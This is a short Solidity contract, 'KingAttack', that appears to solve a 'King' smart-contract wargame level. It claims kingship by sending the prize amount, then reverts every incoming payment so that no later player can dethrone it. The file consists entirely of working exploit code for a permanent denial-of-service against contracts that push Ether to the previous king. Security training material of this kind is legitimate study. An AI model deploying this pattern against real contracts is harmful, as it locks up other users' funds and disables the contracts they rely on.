// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface King {
    receive() external payable;
    function prize() external view returns (uint256);
    function _king() external view returns (address);
}

contract KingAttack {
    King public kingContract;

    constructor (address payable _kingAddress) {
        kingContract = King(_kingAddress);
    }

    function attack() external payable {
        require(msg.value >= kingContract.prize(), "Not enough Ether to attack");

        (bool success, ) = address(kingContract).call{value: msg.value}("");
        require(success, "Attack failed");
    }

    receive() external payable {
        revert("I don't accept Ether");
    }
}
